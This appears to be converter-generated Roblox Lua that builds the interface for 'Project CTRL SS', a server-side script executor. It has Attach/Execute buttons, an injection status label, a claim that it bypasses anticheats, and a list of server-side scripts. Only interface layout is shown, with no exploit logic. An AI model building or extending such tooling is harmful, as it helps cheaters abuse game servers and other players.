--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 153 | Scripts: 33 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(76, 76, 76);
G2L["2"]["Size"] = UDim2.new(0, 407, 0, 296);
G2L["2"]["Position"] = UDim2.new(0.32772, 0, 0.28788, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["BackgroundTransparency"] = 0.5;


-- StarterGui.ScreenGui.Frame.UIStroke
G2L["3"] = Instance.new("UIStroke", G2L["2"]);



-- StarterGui.ScreenGui.Frame.Frame
G2L["4"] = Instance.new("Frame", G2L["2"]);
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Size"] = UDim2.new(0, 407, 0, 2);
G2L["4"]["Position"] = UDim2.new(0, 0, 0.11486, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.ScreenGui.Frame.Frame
G2L["5"] = Instance.new("Frame", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Size"] = UDim2.new(0, 3, 0, 262);
G2L["5"]["Position"] = UDim2.new(0.10565, 0, 0.11486, 0);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.ScreenGui.Frame.Dragify
G2L["6"] = Instance.new("LocalScript", G2L["2"]);
G2L["6"]["Name"] = [[Dragify]];


-- StarterGui.ScreenGui.Frame.TextLabel
G2L["7"] = Instance.new("TextLabel", G2L["2"]);
G2L["7"]["TextWrapped"] = true;
G2L["7"]["BorderSizePixel"] = 0;
G2L["7"]["TextSize"] = 14;
G2L["7"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7"]["TextScaled"] = true;
G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7"]["BackgroundTransparency"] = 1;
G2L["7"]["Size"] = UDim2.new(0, 407, 0, 34);
G2L["7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7"]["Text"] = [[Project CTRL SS]];


-- StarterGui.ScreenGui.Frame.TextLabel.UIStroke
G2L["8"] = Instance.new("UIStroke", G2L["7"]);



-- StarterGui.ScreenGui.Frame.page1
G2L["9"] = Instance.new("Frame", G2L["2"]);
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
G2L["9"]["Size"] = UDim2.new(0, 361, 0, 260);
G2L["9"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["Name"] = [[page1]];
G2L["9"]["BackgroundTransparency"] = 0.5;


-- StarterGui.ScreenGui.Frame.page1.ImageLabel
G2L["a"] = Instance.new("ImageLabel", G2L["9"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["a"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["a"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["BackgroundTransparency"] = 1;
G2L["a"]["Position"] = UDim2.new(0.02263, 0, 0.03066, 0);


-- StarterGui.ScreenGui.Frame.page1.ImageLabel.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.ScreenGui.Frame.page1.ImageLabel.UIStroke
G2L["c"] = Instance.new("UIStroke", G2L["a"]);
G2L["c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c"]["Thickness"] = 2;


-- StarterGui.ScreenGui.Frame.page1.TextLabel
G2L["d"] = Instance.new("TextLabel", G2L["9"]);
G2L["d"]["TextWrapped"] = true;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 14;
G2L["d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["d"]["TextScaled"] = true;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Size"] = UDim2.new(0, 245, 0, 25);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[Welcome, player]];
G2L["d"]["Position"] = UDim2.new(0.32133, 0, 0.02692, 0);


-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
G2L["e"] = Instance.new("UIStroke", G2L["d"]);



-- StarterGui.ScreenGui.Frame.page1.TextLabel.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["d"]);



-- StarterGui.ScreenGui.Frame.page1.TextLabel
G2L["10"] = Instance.new("TextLabel", G2L["9"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["10"]["TextScaled"] = true;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["BackgroundTransparency"] = 1;
G2L["10"]["Size"] = UDim2.new(0, 245, 0, 75);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[This is a rework of CTRL SS]];
G2L["10"]["Position"] = UDim2.new(0.32133, 0, 0.12308, 0);


-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
G2L["11"] = Instance.new("UIStroke", G2L["10"]);



-- StarterGui.ScreenGui.Frame.page1.TextLabel
G2L["12"] = Instance.new("TextLabel", G2L["9"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextSize"] = 14;
G2L["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["12"]["TextScaled"] = true;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["Size"] = UDim2.new(0, 353, 0, 34);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[Now a more advanced scanner!]];
G2L["12"]["Position"] = UDim2.new(0.02216, 0, 0.44615, 0);


-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
G2L["13"] = Instance.new("UIStroke", G2L["12"]);



-- StarterGui.ScreenGui.Frame.page1.TextLabel
G2L["14"] = Instance.new("TextLabel", G2L["9"]);
G2L["14"]["TextWrapped"] = true;
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["14"]["TextScaled"] = true;
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundTransparency"] = 1;
G2L["14"]["Size"] = UDim2.new(0, 353, 0, 34);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Updated to bypass anticheats]];
G2L["14"]["Position"] = UDim2.new(0.02216, 0, 0.57692, 0);


-- StarterGui.ScreenGui.Frame.page1.TextLabel.UIStroke
G2L["15"] = Instance.new("UIStroke", G2L["14"]);



-- StarterGui.ScreenGui.Frame.page1.Status
G2L["16"] = Instance.new("TextLabel", G2L["9"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 14;
G2L["16"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["16"]["TextScaled"] = true;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["Size"] = UDim2.new(0, 353, 0, 34);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[Status: NOT Injected]];
G2L["16"]["Name"] = [[Status]];
G2L["16"]["Position"] = UDim2.new(0.02216, 0, 0.70769, 0);


-- StarterGui.ScreenGui.Frame.page1.Status.UIStroke
G2L["17"] = Instance.new("UIStroke", G2L["16"]);



-- StarterGui.ScreenGui.Frame.page2
G2L["18"] = Instance.new("Frame", G2L["2"]);
G2L["18"]["Visible"] = false;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
G2L["18"]["Size"] = UDim2.new(0, 361, 0, 260);
G2L["18"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Name"] = [[page2]];
G2L["18"]["BackgroundTransparency"] = 0.5;


-- StarterGui.ScreenGui.Frame.page2.Text
G2L["19"] = Instance.new("ScrollingFrame", G2L["18"]);
G2L["19"]["Active"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(113, 113, 113);
G2L["19"]["Name"] = [[Text]];
G2L["19"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["19"]["Size"] = UDim2.new(1, 0, 0.83077, 0);
G2L["19"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["ScrollBarThickness"] = 2;


-- StarterGui.ScreenGui.Frame.page2.Text.LocalScript
G2L["1a"] = Instance.new("LocalScript", G2L["19"]);



-- StarterGui.ScreenGui.Frame.page2.Text.UIStroke
G2L["1b"] = Instance.new("UIStroke", G2L["19"]);



-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel
G2L["1c"] = Instance.new("TextLabel", G2L["19"]);
G2L["1c"]["LineHeight"] = 1.01;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["TextSize"] = 14;
G2L["1c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(75, 75, 75);
G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1c"]["TextColor3"] = Color3.fromRGB(191, 191, 191);
G2L["1c"]["Size"] = UDim2.new(0, 28, 0, 216);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Text"] = [[1]];
G2L["1c"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["1c"]["Position"] = UDim2.new(0, 0, -0.00477, 0);


-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.y
G2L["1d"] = Instance.new("UIStroke", G2L["1c"]);
G2L["1d"]["Name"] = [[y]];


-- StarterGui.ScreenGui.Frame.page2.Text.TextLabel.UIStroke
G2L["1e"] = Instance.new("UIStroke", G2L["1c"]);
G2L["1e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page2.Text.TextBox
G2L["1f"] = Instance.new("TextBox", G2L["19"]);
G2L["1f"]["LineHeight"] = 1.01;
G2L["1f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1f"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(101, 101, 101);
G2L["1f"]["RichText"] = true;
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["1f"]["MultiLine"] = true;
G2L["1f"]["ClearTextOnFocus"] = false;
G2L["1f"]["PlaceholderText"] = [[-- require here]];
G2L["1f"]["Size"] = UDim2.new(0, 332, 0, 216);
G2L["1f"]["Position"] = UDim2.new(0.07756, 0, -0.00477, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[]];


-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);



-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.Completor
G2L["21"] = Instance.new("LocalScript", G2L["1f"]);
G2L["21"]["Name"] = [[Completor]];


-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["1f"]);



-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.UIStroke
G2L["23"] = Instance.new("UIStroke", G2L["1f"]);
G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["23"]["Thickness"] = 2;


-- StarterGui.ScreenGui.Frame.page2.Text.TextBox.y
G2L["24"] = Instance.new("UIStroke", G2L["1f"]);
G2L["24"]["Name"] = [[y]];


-- StarterGui.ScreenGui.Frame.page2.Execute
G2L["25"] = Instance.new("TextButton", G2L["18"]);
G2L["25"]["TextWrapped"] = true;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["TextSize"] = 14;
G2L["25"]["TextScaled"] = true;
G2L["25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Size"] = UDim2.new(0, 104, 0, 41);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["Text"] = [[Execute]];
G2L["25"]["Name"] = [[Execute]];
G2L["25"]["Position"] = UDim2.new(0, 0, 0.83846, 0);


-- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
G2L["26"] = Instance.new("UIStroke", G2L["25"]);



-- StarterGui.ScreenGui.Frame.page2.Execute.UIStroke
G2L["27"] = Instance.new("UIStroke", G2L["25"]);
G2L["27"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["27"]["Thickness"] = 2;


-- StarterGui.ScreenGui.Frame.page2.Clear
G2L["28"] = Instance.new("TextButton", G2L["18"]);
G2L["28"]["TextWrapped"] = true;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextSize"] = 14;
G2L["28"]["TextScaled"] = true;
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Size"] = UDim2.new(0, 104, 0, 41);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[Clear]];
G2L["28"]["Name"] = [[Clear]];
G2L["28"]["Position"] = UDim2.new(0.29086, 0, 0.83846, 0);


-- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
G2L["29"] = Instance.new("UIStroke", G2L["28"]);



-- StarterGui.ScreenGui.Frame.page2.Clear.UIStroke
G2L["2a"] = Instance.new("UIStroke", G2L["28"]);
G2L["2a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2a"]["Thickness"] = 2;


-- StarterGui.ScreenGui.Frame.page2.Inject
G2L["2b"] = Instance.new("TextButton", G2L["18"]);
G2L["2b"]["TextWrapped"] = true;
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextSize"] = 14;
G2L["2b"]["TextScaled"] = true;
G2L["2b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["BackgroundTransparency"] = 1;
G2L["2b"]["Size"] = UDim2.new(0, 77, 0, 41);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[Attach]];
G2L["2b"]["Name"] = [[Inject]];
G2L["2b"]["Position"] = UDim2.new(0.57895, 0, 0.83846, 0);


-- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
G2L["2c"] = Instance.new("UIStroke", G2L["2b"]);



-- StarterGui.ScreenGui.Frame.page2.Inject.UIStroke
G2L["2d"] = Instance.new("UIStroke", G2L["2b"]);
G2L["2d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2d"]["Thickness"] = 2;


-- StarterGui.ScreenGui.Frame.page2.RE
G2L["2e"] = Instance.new("TextButton", G2L["18"]);
G2L["2e"]["TextWrapped"] = true;
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["TextSize"] = 14;
G2L["2e"]["TextScaled"] = true;
G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e"]["BackgroundTransparency"] = 1;
G2L["2e"]["Size"] = UDim2.new(0, 37, 0, 41);
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Text"] = [[RE]];
G2L["2e"]["Name"] = [[RE]];
G2L["2e"]["Position"] = UDim2.new(0.79224, 0, 0.83846, 0);


-- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
G2L["2f"] = Instance.new("UIStroke", G2L["2e"]);



-- StarterGui.ScreenGui.Frame.page2.RE.UIStroke
G2L["30"] = Instance.new("UIStroke", G2L["2e"]);
G2L["30"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["30"]["Thickness"] = 2;


-- StarterGui.ScreenGui.Frame.page2.R6
G2L["31"] = Instance.new("TextButton", G2L["18"]);
G2L["31"]["TextWrapped"] = true;
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 14;
G2L["31"]["TextScaled"] = true;
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["BackgroundTransparency"] = 1;
G2L["31"]["Size"] = UDim2.new(0, 37, 0, 41);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[R6]];
G2L["31"]["Name"] = [[R6]];
G2L["31"]["Position"] = UDim2.new(0.89474, 0, 0.83846, 0);


-- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
G2L["32"] = Instance.new("UIStroke", G2L["31"]);



-- StarterGui.ScreenGui.Frame.page2.R6.UIStroke
G2L["33"] = Instance.new("UIStroke", G2L["31"]);
G2L["33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["33"]["Thickness"] = 2;


-- StarterGui.ScreenGui.Frame.page3
G2L["34"] = Instance.new("Frame", G2L["2"]);
G2L["34"]["Visible"] = false;
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
G2L["34"]["Size"] = UDim2.new(0, 361, 0, 260);
G2L["34"]["Position"] = UDim2.new(0.11302, 0, 0.12162, 0);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Name"] = [[page3]];
G2L["34"]["BackgroundTransparency"] = 0.5;


-- StarterGui.ScreenGui.Frame.page3.TextLabel
G2L["35"] = Instance.new("TextLabel", G2L["34"]);
G2L["35"]["TextWrapped"] = true;
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["TextSize"] = 14;
G2L["35"]["TextScaled"] = true;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["TextColor3"] = Color3.fromRGB(171, 255, 0);
G2L["35"]["BackgroundTransparency"] = 1;
G2L["35"]["Size"] = UDim2.new(0, 361, 0, 29);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[Scripts (SERVER-SIDE)]];


-- StarterGui.ScreenGui.Frame.page3.TextLabel.UIStroke
G2L["36"] = Instance.new("UIStroke", G2L["35"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame
G2L["37"] = Instance.new("ScrollingFrame", G2L["34"]);
G2L["37"]["Active"] = true;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["37"]["CanvasPosition"] = Vector2.new(0, 448);
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["37"]["Size"] = UDim2.new(0, 361, 0, 231);
G2L["37"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Position"] = UDim2.new(0, 0, 0.11154, 0);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["ScrollBarThickness"] = 3;
G2L["37"]["BackgroundTransparency"] = 11;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIStroke
G2L["38"] = Instance.new("UIStroke", G2L["37"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.UIListLayout
G2L["39"] = Instance.new("UIListLayout", G2L["37"]);
G2L["39"]["Padding"] = UDim.new(0, 1);
G2L["39"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["3a"] = Instance.new("TextButton", G2L["37"]);
G2L["3a"]["TextWrapped"] = true;
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["TextScaled"] = true;
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["BackgroundTransparency"] = 1;
G2L["3a"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[c00lgui]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["3b"] = Instance.new("UIStroke", G2L["3a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["3c"] = Instance.new("UIStroke", G2L["3a"]);
G2L["3c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["3d"] = Instance.new("LocalScript", G2L["3a"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["3e"] = Instance.new("TextButton", G2L["37"]);
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextScaled"] = true;
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["BackgroundTransparency"] = 1;
G2L["3e"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Text"] = [[DEX SS]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["3f"] = Instance.new("UIStroke", G2L["3e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["40"] = Instance.new("UIStroke", G2L["3e"]);
G2L["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["3e"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["42"] = Instance.new("TextButton", G2L["37"]);
G2L["42"]["TextWrapped"] = true;
G2L["42"]["BorderSizePixel"] = 0;
G2L["42"]["TextSize"] = 14;
G2L["42"]["TextScaled"] = true;
G2L["42"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["BackgroundTransparency"] = 1;
G2L["42"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["42"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Text"] = [[HD Admin]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["43"] = Instance.new("UIStroke", G2L["42"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["44"] = Instance.new("UIStroke", G2L["42"]);
G2L["44"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["45"] = Instance.new("LocalScript", G2L["42"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
G2L["46"] = Instance.new("TextButton", G2L["37"]);
G2L["46"]["TextWrapped"] = true;
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["TextSize"] = 14;
G2L["46"]["TextScaled"] = true;
G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["46"]["BackgroundTransparency"] = 1;
G2L["46"]["Size"] = UDim2.new(0, 361, 0, 33);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["Text"] = [[k00pGUI]];


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["47"] = Instance.new("UIStroke", G2L["46"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.UIStroke
G2L["48"] = Instance.new("UIStroke", G2L["46"]);
G2L["48"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton.LocalScript
G2L["49"] = Instance.new("LocalScript", G2L["46"]);



-- StarterGui.ScreenGui.Frame.page3.ScrollingFrame.TextButton
